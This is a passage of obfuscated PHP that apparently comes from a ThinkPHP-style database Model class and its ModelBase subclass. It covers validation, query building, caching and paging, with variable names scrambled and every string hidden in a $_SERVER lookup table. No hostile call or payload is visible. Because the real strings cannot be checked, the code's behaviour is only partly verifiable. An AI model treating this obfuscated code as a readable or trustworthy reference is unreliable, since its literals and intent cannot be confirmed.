think_config($…„şóò¶[359]); if (!isset($ÛàáË½°[$ığŠøÜş]) || Session::get($ığŠøÜş)) { return !1; } list($ºŞäÙˆ¹, $íÊãÛ˜) = explode($…„şóò¶[11], $ÛàáË½°[$ığŠøÜş]); if ($íÊãÛ˜ && Session::get($ığŠøÜş . $…„şóò¶[10] . $ºŞäÙˆ¹) === $íÊãÛ˜) { Session::remove($ığŠøÜş . $…„şóò¶[10] . $ºŞäÙˆ¹); return !0; } if (think_config($…„şóò¶[362])) { Session::remove($ığŠøÜş . $…„şóò¶[10] . $ºŞäÙˆ¹); } return !1; } return !0; } public function regex($¨Ä¡ç»Ô, $ß–¦òÈ™) { $±ÂÈÏ =& $_SERVER[Ñ¯©ç]; $İõ®™åµ = array($±ÂÈÏ[363] => $±ÂÈÏ[364], $±ÂÈÏ[365] => $±ÂÈÏ[366], $±ÂÈÏ[367] => $±ÂÈÏ[368], $±ÂÈÏ[369] => $±ÂÈÏ[370], $±ÂÈÏ[371] => $±ÂÈÏ[372], $±ÂÈÏ[373] => $±ÂÈÏ[374], $±ÂÈÏ[375] => $±ÂÈÏ[376], $±ÂÈÏ[350] => $±ÂÈÏ[377], $±ÂÈÏ[378] => $±ÂÈÏ[379]); if (isset($İõ®™åµ[strtolower($ß–¦òÈ™)])) { $ß–¦òÈ™ = $İõ®™åµ[strtolower($ß–¦òÈ™)]; } return preg_match($ß–¦òÈ™, $¨Ä¡ç»Ô) === 1; } private function autoOperation(&$ü¶¶óÔİ, $£ËıƒÏò) { $¢âßÚ =& $_SERVER[Ñ¯©ç]; if (!empty($this->options[$¢âßÚ[380]])) { $»ÜŠ£ö = $this->options[$¢âßÚ[380]]; unset($this->options[$¢âßÚ[380]]); } elseif (!empty($this->_auto)) { $»ÜŠ£ö = $this->_auto; } if (isset($»ÜŠ£ö)) { foreach ($»ÜŠ£ö as $Æ•¸‹¢î) { if (empty($Æ•¸‹¢î[2])) { $Æ•¸‹¢î[2] = THINK_MODEL_INSERT; } if ($£ËıƒÏò == $Æ•¸‹¢î[2] || $Æ•¸‹¢î[2] == THINK_MODEL_BOTH) { switch (trim($Æ•¸‹¢î[3])) { case $¢âßÚ[381]: case $¢âßÚ[382]: $Ùüîà•É = isset($Æ•¸‹¢î[4]) ? (array) $Æ•¸‹¢î[4] : array(); if (isset($ü¶¶óÔİ[$Æ•¸‹¢î[0]])) { array_unshift($Ùüîà•É, $ü¶¶óÔİ[$Æ•¸‹¢î[0]]); } if ($¢âßÚ[381] == $Æ•¸‹¢î[3]) { $ü¶¶óÔİ[$Æ•¸‹¢î[0]] = call_user_func_array($Æ•¸‹¢î[1], $Ùüîà•É); } else { $ü¶¶óÔİ[$Æ•¸‹¢î[0]] = call_user_func_array(array(&$this, $Æ•¸‹¢î[1]), $Ùüîà•É); } break; case $¢âßÚ[334]: $ü¶¶óÔİ[$Æ•¸‹¢î[0]] = $ü¶¶óÔİ[$Æ•¸‹¢î[1]]; break; case $¢âßÚ[383]: if ($¢âßÚ[12] === $ü¶¶óÔİ[$Æ•¸‹¢î[0]]) { unset($ü¶¶óÔİ[$Æ•¸‹¢î[0]]); } break; case $¢âßÚ[384]: default: $ü¶¶óÔİ[$Æ•¸‹¢î[0]] = $Æ•¸‹¢î[1]; } if (!1 === $ü¶¶óÔİ[$Æ•¸‹¢î[0]]) { unset($ü¶¶óÔİ[$Æ•¸‹¢î[0]]); } } } } return $ü¶¶óÔİ; } protected function autoValidation($ÃıÛÄ¾µ, $ŒìÍª¢) { $„Åêœè =& $_SERVER[Ñ¯©ç]; if (!empty($this->options[$„Åêœè[385]])) { $÷ñ¹šµñ = $this->options[$„Åêœè[385]]; unset($this->options[$„Åêœè[385]]); } elseif (!empty($this->_validate)) { $÷ñ¹šµñ = $this->_validate; } if (isset($÷ñ¹šµñ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($÷ñ¹šµñ as $ûéû·º => $Ç´´Îı“) { if (empty($Ç´´Îı“[5]) || $Ç´´Îı“[5] == THINK_MODEL_BOTH || $Ç´´Îı“[5] == $ŒìÍª¢) { if (0 == strpos($Ç´´Îı“[2], $„Åêœè[386]) && strpos($Ç´´Îı“[2], $„Åêœè[387])) { $Ç´´Îı“[2] = think_lang(substr($Ç´´Îı“[2], 2, -1)); } $Ç´´Îı“[3] = isset($Ç´´Îı“[3]) ? $Ç´´Îı“[3] : THINK_EXISTS_VALIDATE; $Ç´´Îı“[4] = isset($Ç´´Îı“[4]) ? $Ç´´Îı“[4] : $„Åêœè[388]; switch ($Ç´´Îı“[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÃıÛÄ¾µ, $Ç´´Îı“)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($„Åêœè[12] != trim($ÃıÛÄ¾µ[$Ç´´Îı“[0]])) { if (!1 === $this->_validationField($ÃıÛÄ¾µ, $Ç´´Îı“)) { return !1; } } break; default: if (isset($ÃıÛÄ¾µ[$Ç´´Îı“[0]])) { if (!1 === $this->_validationField($ÃıÛÄ¾µ, $Ç´´Îı“)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ášı°Ëé, $ÌäøúÚÇ) { if (!1 === $this->_validationFieldItem($Ášı°Ëé, $ÌäøúÚÇ)) { if ($this->patchValidate) { $this->error[$ÌäøúÚÇ[0]] = $ÌäøúÚÇ[2]; } else { $this->error = $ÌäøúÚÇ[2]; return !1; } } return; } protected function _validationFieldItem($íâª€È, $ØÌ›õıÌ) { $íÂÕâÃ´ =& $_SERVER[Ñ¯©ç]; switch (strtolower(trim($ØÌ›õıÌ[4]))) { case $íÂÕâÃ´[381]: case $íÂÕâÃ´[382]: $ôŞ­ì£» = isset($ØÌ›õıÌ[6]) ? (array) $ØÌ›õıÌ[6] : array(); if (is_string($ØÌ›õıÌ[0]) && strpos($ØÌ›õıÌ[0], $íÂÕâÃ´[50])) { $ØÌ›õıÌ[0] = explode($íÂÕâÃ´[50], $ØÌ›õıÌ[0]); } if (is_array($ØÌ›õıÌ[0])) { foreach ($ØÌ›õıÌ[0] as $ø¸÷£Ã) { $ÕŸ³ÖÌÀ[$ø¸÷£Ã] = $íâª€È[$ø¸÷£Ã]; } array_unshift($ôŞ­ì£», $ÕŸ³ÖÌÀ); } else { array_unshift($ôŞ­ì£», $íâª€È[$ØÌ›õıÌ[0]]); } if ($íÂÕâÃ´[381] == $ØÌ›õıÌ[4]) { return call_user_func_array($ØÌ›õıÌ[1], $ôŞ­ì£»); } else { return call_user_func_array(array(&$this, $ØÌ›õıÌ[1]), $ôŞ­ì£»); } case $íÂÕâÃ´[389]: return $íâª€È[$ØÌ›õıÌ[0]] == $íâª€È[$ØÌ›õıÌ[1]]; case $íÂÕâÃ´[390]: if (is_string($ØÌ›õıÌ[0]) && strpos($ØÌ›õıÌ[0], $íÂÕâÃ´[50])) { $ØÌ›õıÌ[0] = explode($íÂÕâÃ´[50], $ØÌ›õıÌ[0]); } $ª÷••× = array(); if (is_array($ØÌ›õıÌ[0])) { foreach ($ØÌ›õıÌ[0] as $ø¸÷£Ã) { $ª÷••×[$ø¸÷£Ã] = $íâª€È[$ø¸÷£Ã]; } } else { $ª÷••×[$ØÌ›õıÌ[0]] = $íâª€È[$ØÌ›õıÌ[0]]; } if (!empty($íâª€È[$this->getPk()])) { $ª÷••×[$this->getPk()] = array($íÂÕâÃ´[391], $íâª€È[$this->getPk()]); } if ($this->where($ª÷••×)->find()) { return !1; } return !0; default: return $this->check($íâª€È[$ØÌ›õıÌ[0]], $ØÌ›õıÌ[1], $ØÌ›õıÌ[4]); } } public function check($²àÓğÆæ, $‡‡Â‡½ğ, $ÃÎş€çÆ = "\162\145\147\x65\x78") { $øå»˜ëö =& $_SERVER[Ñ¯©ç]; $ÃÎş€çÆ = strtolower(trim($ÃÎş€çÆ)); switch ($ÃÎş€çÆ) { case $øå»˜ëö[7]: case $øå»˜ëö[392]: $¹¯‚àãÍ = is_array($‡‡Â‡½ğ) ? $‡‡Â‡½ğ : explode($øå»˜ëö[50], $‡‡Â‡½ğ); return $ÃÎş€çÆ == $øå»˜ëö[7] ? in_array($²àÓğÆæ, $¹¯‚àãÍ) : !in_array($²àÓğÆæ, $¹¯‚àãÍ); case $øå»˜ëö[393]: case $øå»˜ëö[394]: if (is_array($‡‡Â‡½ğ)) { $ òÉ¢ª× = $‡‡Â‡½ğ[0]; $³’ì²·ï = $‡‡Â‡½ğ[1]; } else { list($ òÉ¢ª×, $³’ì²·ï) = explode($øå»˜ëö[50], $‡‡Â‡½ğ); } return $ÃÎş€çÆ == $øå»˜ëö[393] ? $²àÓğÆæ >= $ òÉ¢ª× && $²àÓğÆæ <= $³’ì²·ï : $²àÓğÆæ < $ òÉ¢ª× || $²àÓğÆæ > $³’ì²·ï; case $øå»˜ëö[395]: case $øå»˜ëö[396]: return $ÃÎş€çÆ == $øå»˜ëö[395] ? $²àÓğÆæ == $‡‡Â‡½ğ : $²àÓğÆæ != $‡‡Â‡½ğ; case $øå»˜ëö[397]: $´¨ÀŠØÆ = mb_strlen($²àÓğÆæ, $øå»˜ëö[398]); if (strpos($‡‡Â‡½ğ, $øå»˜ëö[50])) { list($ òÉ¢ª×, $³’ì²·ï) = explode($øå»˜ëö[50], $‡‡Â‡½ğ); return $´¨ÀŠØÆ >= $ òÉ¢ª× && $´¨ÀŠØÆ <= $³’ì²·ï; } else { return $´¨ÀŠØÆ == $‡‡Â‡½ğ; } case $øå»˜ëö[399]: list($îü°‡–, $‚äí·ô™) = explode($øå»˜ëö[50], $‡‡Â‡½ğ); if (!is_numeric($îü°‡–)) { $îü°‡– = strtotime($îü°‡–); } if (!is_numeric($‚äí·ô™)) { $‚äí·ô™ = strtotime($‚äí·ô™); } return NOW_TIME >= $îü°‡– && NOW_TIME <= $‚äí·ô™; case $øå»˜ëö[400]: return in_array(get_client_ip(), explode($øå»˜ëö[50], $‡‡Â‡½ğ)); case $øå»˜ëö[401]: return !in_array(get_client_ip(), explode($øå»˜ëö[50], $‡‡Â‡½ğ)); case $øå»˜ëö[388]: default: return $this->regex($²àÓğÆæ, $‡‡Â‡½ğ); } } public function query($«—â‘£¯, $‚ìÔ‚”Å = false) { $øÔ¨ˆú =& $_SERVER[Ñ¯©ç]; if (!is_bool($‚ìÔ‚”Å) && !is_array($‚ìÔ‚”Å)) { $‚ìÔ‚”Å = func_get_args(); array_shift($‚ìÔ‚”Å); } $«—â‘£¯ = str_replace(array($øÔ¨ˆú[59], $øÔ¨ˆú[402]), $øÔ¨ˆú[53], $«—â‘£¯); $«—â‘£¯ = $this->parseSql($«—â‘£¯, $‚ìÔ‚”Å); return $this->db->query($«—â‘£¯); } public function execute($ÏğµøŒÆ, $«ÀÔÇ¶â = false) { if (!is_bool($«ÀÔÇ¶â) && !is_array($«ÀÔÇ¶â)) { $«ÀÔÇ¶â = func_get_args(); array_shift($«ÀÔÇ¶â); } $ÏğµøŒÆ = $this->parseSql($ÏğµøŒÆ, $«ÀÔÇ¶â); return $this->db->execute($ÏğµøŒÆ); } protected function parseSql($Ÿø•€Ê, $º­º¼) { $ø¬ÕÚ“Ã =& $_SERVER[Ñ¯©ç]; if (!0 === $º­º¼) { $¶Å¿®ŞÍ = $this->_parseOptions(); $Ÿø•€Ê = $this->db->parseSql($Ÿø•€Ê, $¶Å¿®ŞÍ); } elseif (is_array($º­º¼)) { $º­º¼ = array_map(array($this->db, $ø¬ÕÚ“Ã[403]), $º­º¼); $Ÿø•€Ê = vsprintf($Ÿø•€Ê, $º­º¼); } else { $Ÿø•€Ê = strtr($Ÿø•€Ê, array($ø¬ÕÚ“Ã[404] => $this->getTableName(), $ø¬ÕÚ“Ã[405] => think_config($ø¬ÕÚ“Ã[305]))); } $this->db->setModel($this->name); return $Ÿø•€Ê; } public function db($ò¬ºÕâ¬ = '', $ªƒêå¦ô = '', $ê³Ğ¯ÁÊ = array()) { $Ë“€ß· =& $_SERVER[Ñ¯©ç]; if ($Ë“€ß·[12] === $ò¬ºÕâ¬ && $this->db) { return $this->db; } static $¨Ø‘í£à = array(); static $©ç›ÁôÂ = array(); if (!isset($©ç›ÁôÂ[$ò¬ºÕâ¬]) || isset($©ç›ÁôÂ[$ò¬ºÕâ¬]) && $ªƒêå¦ô && $¨Ø‘í£à[$ò¬ºÕâ¬] != $ªƒêå¦ô) { if (!empty($ªƒêå¦ô) && is_string($ªƒêå¦ô) && !1 === strpos($ªƒêå¦ô, $Ë“€ß·[8])) { $ªƒêå¦ô = think_config($ªƒêå¦ô); } $ò¬ºÕâ¬ = think_guid($ªƒêå¦ô); $©ç›ÁôÂ[$ò¬ºÕâ¬] = Db::getInstance($ªƒêå¦ô); } elseif (NULL === $ªƒêå¦ô) { $©ç›ÁôÂ[$ò¬ºÕâ¬]->close(); unset($©ç›ÁôÂ[$ò¬ºÕâ¬]); return; } if (!empty($ê³Ğ¯ÁÊ)) { if (is_string($ê³Ğ¯ÁÊ)) { parse_str($ê³Ğ¯ÁÊ, $ê³Ğ¯ÁÊ); } foreach ($ê³Ğ¯ÁÊ as $±ÉÚèÚ£ => $½ÔÔ¯Ã) { $this->setProperty($±ÉÚèÚ£, $½ÔÔ¯Ã); } } $¨Ø‘í£à[$ò¬ºÕâ¬] = $ªƒêå¦ô; $this->db = $©ç›ÁôÂ[$ò¬ºÕâ¬]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ä˜çç¥Ç = get_class($this); if ($ä˜çç¥Ç == $_SERVER[Ñ¯©ç][406]) { return $this->name; } $this->name = substr($ä˜çç¥Ç, 0, -5); } return $this->name; } public function getTableName() { $Ç¢®òº€ =& $_SERVER[Ñ¯©ç]; if (empty($this->trueTableName)) { $¤±µ¹ëÔ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ç¢®òº€[12]; if (!empty($this->tableName)) { $¤±µ¹ëÔ .= $this->tableName; } else { $¤±µ¹ëÔ .= think_parse_name($this->name); } $this->trueTableName = strtolower($¤±µ¹ëÔ); } return (!empty($this->dbName) ? $this->dbName . $Ç¢®òº€[10] : $Ç¢®òº€[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÔµàîõÔ =& $_SERVER[Ñ¯©ç]; return isset($this->fields[$ÔµàîõÔ[312]]) ? $this->fields[$ÔµàîõÔ[312]] : $this->pk; } public function getDbFields() { $•ëçª =& $_SERVER[Ñ¯©ç]; if (isset($this->options[$•ëçª[340]])) { $Ø¼§ ß¯ = $this->db->getFields($this->options[$•ëçª[340]]); return $Ø¼§ ß¯ ? array_keys($Ø¼§ ß¯) : !1; } if ($this->fields) { $Ø¼§ ß¯ = $this->fields; unset($Ø¼§ ß¯[$•ëçª[311]], $Ø¼§ ß¯[$•ëçª[312]], $Ø¼§ ß¯[$•ëçª[313]], $Ø¼§ ß¯[$•ëçª[310]]); return $Ø¼§ ß¯; } return !1; } public function data($ÖÍ­ø”± = '') { $‹Ì–Õ£ğ =& $_SERVER[Ñ¯©ç]; if ($‹Ì–Õ£ğ[12] === $ÖÍ­ø”± && !empty($this->data)) { return $this->data; } if (is_object($ÖÍ­ø”±)) { $ÖÍ­ø”± = get_object_vars($ÖÍ­ø”±); } elseif (is_string($ÖÍ­ø”±)) { parse_str($ÖÍ­ø”±, $ÖÍ­ø”±); } elseif (!is_array($ÖÍ­ø”±)) { think_exception(think_lang($‹Ì–Õ£ğ[332])); } $this->data = $ÖÍ­ø”±; return $this; } public function join($»ôŞ·•Å) { $°“„¨œ =& $_SERVER[Ñ¯©ç]; if (is_array($»ôŞ·•Å)) { $this->options[$°“„¨œ[343]] = $»ôŞ·•Å; } elseif (!empty($»ôŞ·•Å)) { $this->options[$°“„¨œ[343]][] = $»ôŞ·•Å; } return $this; } public function union($¸Â†Çæ, $É®á­Ìİ = false) { $ÆøÛ¿ =& $_SERVER[Ñ¯©ç]; if (empty($¸Â†Çæ)) { return $this; } if ($É®á­Ìİ) { $this->options[$ÆøÛ¿[407]][$ÆøÛ¿[408]] = !0; } if (is_object($¸Â†Çæ)) { $¸Â†Çæ = get_object_vars($¸Â†Çæ); } if (is_string($¸Â†Çæ)) { $ì‘Ã™²” = $¸Â†Çæ; } elseif (is_array($¸Â†Çæ)) { if (isset($¸Â†Çæ[0])) { $this->options[$ÆøÛ¿[407]] = array_merge($this->options[$ÆøÛ¿[407]], $¸Â†Çæ); return $this; } else { $ì‘Ã™²” = $¸Â†Çæ; } } else { think_exception(think_lang($ÆøÛ¿[332])); } $this->options[$ÆøÛ¿[407]][] = $ì‘Ã™²”; return $this; } public function cache($ã†ØÚ†² = true, $¸»·é¯ = null, $‚ÇšÑºÀ = '') { $×«Àæ¨¥ =& $_SERVER[Ñ¯©ç]; if (!1 !== $ã†ØÚ†²) { $this->options[$×«Àæ¨¥[409]] = array($×«Àæ¨¥[107] => $ã†ØÚ†², $×«Àæ¨¥[399] => $¸»·é¯, $×«Àæ¨¥[33] => $‚ÇšÑºÀ); } return $this; } public function field($Ï£«ä¤ô, $Áø™•ä† = false) { $®Áªâ±ç =& $_SERVER[Ñ¯©ç]; if (!0 === $Ï£«ä¤ô) { $š¸åŠ = $this->getDbFields(); $Ï£«ä¤ô = $š¸åŠ ? $š¸åŠ : $®Áªâ±ç[221]; } elseif ($Áø™•ä†) { if (is_string($Ï£«ä¤ô)) { $Ï£«ä¤ô = explode($®Áªâ±ç[50], $Ï£«ä¤ô); } $š¸åŠ = $this->getDbFields(); $Ï£«ä¤ô = $š¸åŠ ? array_diff($š¸åŠ, $Ï£«ä¤ô) : $Ï£«ä¤ô; } $this->options[$®Áªâ±ç[334]] = $Ï£«ä¤ô; return $this; } public function scope($ôñ¯­ö° = '', $îşË®¯ = NULL) { $†ë ïá =& $_SERVER[Ñ¯©ç]; if ($†ë ïá[12] === $ôñ¯­ö°) { if (isset($this->_scope[$†ë ïá[37]])) { $¦à—ïîØ = $this->_scope[$†ë ïá[37]]; } else { return $this; } } elseif (is_string($ôñ¯­ö°)) { $ÜÏ¼— = explode($†ë ïá[50], $ôñ¯­ö°); $¦à—ïîØ = array(); foreach ($ÜÏ¼— as $¾¶ŒêË) { if (!isset($this->_scope[$¾¶ŒêË])) { continue; } $¦à—ïîØ = array_merge($¦à—ïîØ, $this->_scope[$¾¶ŒêË]); } if (!empty($îşË®¯) && is_array($îşË®¯)) { $¦à—ïîØ = array_merge($¦à—ïîØ, $îşË®¯); } } elseif (is_array($ôñ¯­ö°)) { $¦à—ïîØ = $ôñ¯­ö°; } if (is_array($¦à—ïîØ) && !empty($¦à—ïîØ)) { $this->options = array_merge($this->options, array_change_key_case($¦à—ïîØ)); } return $this; } public function where($ Ô‚ßç¿, $Œ²Ì™î™ = null) { $ùîÒò¤Ô =& $_SERVER[Ñ¯©ç]; if (!is_null($Œ²Ì™î™) && is_string($ Ô‚ßç¿)) { if (!is_array($Œ²Ì™î™)) { $Œ²Ì™î™ = func_get_args(); array_shift($Œ²Ì™î™); } $Œ²Ì™î™ = array_map(array($this->db, $ùîÒò¤Ô[403]), $Œ²Ì™î™); $ Ô‚ßç¿ = vsprintf($ Ô‚ßç¿, $Œ²Ì™î™); } elseif (is_object($ Ô‚ßç¿)) { $ Ô‚ßç¿ = get_object_vars($ Ô‚ßç¿); } elseif (is_array($ Ô‚ßç¿)) { foreach ($ Ô‚ßç¿ as $İæèìŒı => $¸·¯Ã·Ã) { if ((is_numeric($İæèìŒı) || !$İæèìŒı) && is_string($¸·¯Ã·Ã)) { if (strpos($¸·¯Ã·Ã, $ùîÒò¤Ô[410]) === 0) { continue; } think_trace($ùîÒò¤Ô[411], $ùîÒò¤Ô[12], $ùîÒò¤Ô[49]); die; } } } if (is_string($ Ô‚ßç¿) && $ùîÒò¤Ô[12] != $ Ô‚ßç¿) { $¨¡Ù‹‹„ = array(); $¨¡Ù‹‹„[$ùîÒò¤Ô[412]] = $ Ô‚ßç¿; $ Ô‚ßç¿ = $¨¡Ù‹‹„; } if (isset($this->options[$ùîÒò¤Ô[336]])) { $this->options[$ùîÒò¤Ô[336]] = array_merge($this->options[$ùîÒò¤Ô[336]], $ Ô‚ßç¿); } else { $this->options[$ùîÒò¤Ô[336]] = $ Ô‚ßç¿; } return $this; } public function limit($Éòâ¢ë¤, $ËÒé¶ ¢ = null) { $½ªïæ¢á =& $_SERVER[Ñ¯©ç]; $this->options[$½ªïæ¢á[352]] = is_null($ËÒé¶ ¢) ? $Éòâ¢ë¤ : $Éòâ¢ë¤ . $½ªïæ¢á[50] . $ËÒé¶ ¢; return $this; } public function page($¯œ¹› ‘, $ŒÈòĞ€ì = null) { $ÀÑøéÖÒ =& $_SERVER[Ñ¯©ç]; $this->options[$ÀÑøéÖÒ[413]] = is_null($ŒÈòĞ€ì) ? $¯œ¹› ‘ : $¯œ¹› ‘ . $ÀÑøéÖÒ[50] . $ŒÈòĞ€ì; return $this; } public function comment($Ø¼‚ôƒ¡) { $this->options[$_SERVER[Ñ¯©ç][414]] = $Ø¼‚ôƒ¡; return $this; } public function setProperty($ˆÎª˜ô“, $§ÚäÌ…®) { if (property_exists($this, $ˆÎª˜ô“)) { $this->{$ˆÎª˜ô“} = $§ÚäÌ…®; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\x66\x79\x54\151\x6d\145", "\164\x69\155\x65", "\151\156\x73\x65\x72\x74\54\165\x70\x64\x61\164\145", "\x66\165\156\143\164\151\x6f\156"), array("\x63\x72\145\x61\164\145\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\162\x74", "\146\165\156\x63\x74\x69\x6f\156")); public function setDataAuto($ïò•‘¨) { $this->dataAuto = $ïò•‘¨; } public function __construct($™ÉªÂòÁ = '', $öÌÇÑÃæ = '', $ÁÇ ä“© = '') { parent::__construct($™ÉªÂòÁ, $öÌÇÑÃæ, $ÁÇ ä“©); } protected $tableMeta = array(); protected function _beforeInsert(&$áıÖû¸¦, $¹Ä«½¢) { $÷²ùÚ¶é =& $_SERVER[Ñ¯©ç]; if (!$this->checkDataAutoHas($÷²ùÚ¶é[415])) { return; } $this->dataBeforeFilter($áıÖû¸¦, $÷²ùÚ¶é[415]); } protected function _beforeUpdate(&$¤…ƒ¢­, $¾ÍÛª³ê) { $üÖıó¡ =& $_SERVER[Ñ¯©ç]; if (!$this->checkDataAutoHas($üÖıó¡[416])) { return; } $this->dataBeforeFilter($¤…ƒ¢­, $üÖıó¡[416]); } protected function _afterSelect(&$¦¹¯ƒô, $¹şÇ‘£Ì) { if (!is_array($¦¹¯ƒô)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ñ¯©ç][417])) { return; } foreach ($¦¹¯ƒô as &$Ÿî´ìıß) { $this->dataAfterFilter($Ÿî´ìıß); } unset($Ÿî´ìıß); } protected function _afterFind(&$²‡°êúĞ, $½ıè™Ñ) { if (!is_array($²‡°êúĞ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ñ¯©ç][417])) { return; } $this->dataAfterFilter($²‡°êúĞ); } public static function textEncode($˜ª¾Ş¦ˆ) { if (!$˜ª¾Ş¦ˆ) { return $˜ª¾Ş¦ˆ; } $Ê¼ ‚¦ = json_encode($˜ª¾Ş¦ˆ); $Ê¼ ‚¦ = preg_replace_callback($_SERVER[Ñ¯©ç][418], function ($Á“î‘µì) { return addslashes($Á“î‘µì[0]); }, $Ê¼ ‚¦); return json_decode($Ê¼ ‚¦); } public static function textDecode($Ä¤±ñõ¸) { $àºìŒ«Ë =& $_SERVER[Ñ¯©ç]; $Ï“œ™ñ› = json_encode($Ä¤±ñõ¸); $Ï“œ™ñ› = preg_replace_callback($àºìŒ«Ë[419], function ($ ¤Úá½ª) { return $_SERVER[Ñ¯©ç][110]; }, $Ï“œ™ñ›); return json_decode($Ï“œ™ñ›); } public function setAutoIncrement($ºøÉ³¾) { $¸ÇıÃèµ = array($this->getPk() => $ºøÉ³¾); $à‡øï¢¸ = $this->data($¸ÇıÃèµ)->add(); if ($à‡øï¢¸) { $this->delete($à‡øï¢¸); } } public function getAutoIncrement() { $ÃÂßÑ÷± = $this->getTableName(); $ï¿½ÅÏÆ = $this->max($this->getPk()); $“¤ßÅï = $this->query("\163\x68\157\167\x20\x74\141\x62\x6c\x65\x20\163\164\x61\164\165\163\x20\x77\x68\x65\x72\x65\x20\x4e\141\155\145\75\47{$ÃÂßÑ÷±}\x27"); $Û»“Ãæ´ = $“¤ßÅï[0][$_SERVER[Ñ¯©ç][420]]; $íÂ¹Íˆ = max($ï¿½ÅÏÆ, $Û»“Ãæ´); return $íÂ¹Íˆ; } protected function _callBefore($·íó“ˆ», $û‰–åÈ) { return $this->cacheCallCheck($·íó“ˆ», $û‰–åÈ, !1); } protected function _callAfter($Š©ôÀ¡Æ, $†¯Í‚Â) { return $this->cacheCallCheck($Š©ôÀ¡Æ, $†¯Í‚Â, !0); } protected function cacheFunctionAlias($¢“Ãù¼¨) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ùÄ¾€İû, $ü¥Óğ½, $†“êĞÄÈ = false) { $„‘Ë¢ì¬ = $this->cacheFunctionAlias($ü¥Óğ½); if (!$„‘Ë¢ì¬) { return; } foreach ($„‘Ë¢ì¬ as $·Ìä¨Êù => $ğİ¸¬Íœ) { $¤¯¾ñ†” = $ğİ¸¬Íœ[0]; $ÈÏÍõäê = explode($_SERVER[Ñ¯©ç][50], $ğİ¸¬Íœ[1]); if ($ùÄ¾€İû == $·Ìä¨Êù) { return $this->cacheFunctionGet($·Ìä¨Êù, $¤¯¾ñ†”); } if ($†“êĞÄÈ && in_array($ùÄ¾€İû, $ÈÏÍõäê)) { $this->cacheFunctionClear($·Ìä¨Êù, $¤¯¾ñ†”); } } } public function cacheFunctionGet($‚Á©¥÷, $Ê÷¼ŸÏ) { $ËöÉº—¡ = $this->cacheKeyMake($‚Á©¥÷, $Ê÷¼ŸÏ); $ŠØé¡ğÈ = Cache::get($ËöÉº—¡); if (!is_array($ŠØé¡ğÈ)) { $ŠØé¡ğÈ = call_user_func_array(array($this, $‚Á©¥÷), array($Ê÷¼ŸÏ, !0)); Cache::set($ËöÉº—¡, $ŠØé¡ğÈ); } return $ŠØé¡ğÈ; } public function cacheFunctionClear($ËÀ¸ğ‘, $ÉÌŸˆè¥) { $ÖÇ”æÓˆ = $ÉÌŸˆè¥; if (!is_array($ÉÌŸˆè¥)) { $ÖÇ”æÓˆ = array($ÉÌŸˆè¥); } foreach ($ÖÇ”æÓˆ as $ÍšÆ­Ø©) { $îÒ„Á¯è = $this->cacheKeyMake($ËÀ¸ğ‘, $ÍšÆ­Ø©); Cache::remove($îÒ„Á¯è); } } private function cacheKeyMake($ÈæÙÂ”£, $ó–˜×Û­) { $‡ÒÕòê— =& $_SERVER[Ñ¯©ç]; return get_class($this) . $‡ÒÕòê—[11] . $ÈæÙÂ”£ . $‡ÒÕòê—[421] . $ó–˜×Û­; } protected function selectPageReset() { $²€Í¾à€ =& $_SERVER[Ñ¯©ç]; if (isset($GLOBALS[$²€Í¾à€[422]])) { return; } $GLOBALS[$²€Í¾à€[422]] = isset($GLOBALS[$²€Í¾à€[7]][$²€Í¾à€[423]]) ? $GLOBALS[$²€Í¾à€[7]][$²€Í¾à€[423]] : !1; $GLOBALS[$²€Í¾à€[424]] = isset($GLOBALS[$²€Í¾à€[7]][$²€Í¾à€[413]]) ? $GLOBALS[$²€Í¾à€[7]][$²€Í¾à€[413]] : !1; $GLOBALS[$²€Í¾à€[7]][$²€Í¾à€[423]] = !1; $GLOBALS[$²€Í¾à€[7]][$²€Í¾à€[413]] = !1; } protected function selectPageRestore() { $Ñí¤‰ãÛ =& $_SERVER[Ñ¯©ç]; if (!isset($GLOBALS[$Ñí¤‰ãÛ[422]])) { return; } $GLOBALS[$Ñí¤‰ãÛ[7]][$Ñí¤‰ãÛ[423]] = $GLOBALS[$Ñí¤‰ãÛ[422]]; $GLOBALS[$Ñí¤‰ãÛ[7]][$Ñí¤‰ãÛ[413]] = $GLOBALS[$Ñí¤‰ãÛ[424]]; if ($GLOBALS[$Ñí¤‰ãÛ[7]][$Ñí¤‰ãÛ[423]] === !1) { unset($GLOBALS[$Ñí¤‰ãÛ[7]][$Ñí¤‰ãÛ[423]]); } if ($GLOBALS[$Ñí¤‰ãÛ[7]][$Ñí¤‰ãÛ[413]] === !1) { unset($GLOBALS[$Ñí¤‰ãÛ[7]][$Ñí¤‰ãÛ[413]]); } unset($GLOBALS[$Ñí¤‰ãÛ[422]]); unset($GLOBALS[$Ñí¤‰ãÛ[424]]); } protected function selectPage($Ù”àÅŞ‘ = 200, $øı‡¯àß = 1) { $Ñò›Îö½ =& $_SERVER[Ñ¯©ç]; global $in; $Ô½ÒŞÚ = $this->optionsValue(); $éËÉ«ù = 50000; $Ù”àÅŞ‘ = isset($in[$Ñò›Îö½[423]]) && $in[$Ñò›Îö½[423]] ? $in[$Ñò›Îö½[423]] : $Ù”àÅŞ‘; if ($Ù”àÅŞ‘ === -1) { $in[$Ñò›Îö½[423]] = !1; $éËÉ«ù = 100000000; $Ù”àÅŞ‘ = $éËÉ«ù; } $³¨«Å« = $Ô½ÒŞÚ; $³¨«Å«[$Ñò›Îö½[425]] = array(); $Ù”àÅŞ‘ = intval($Ù”àÅŞ‘); 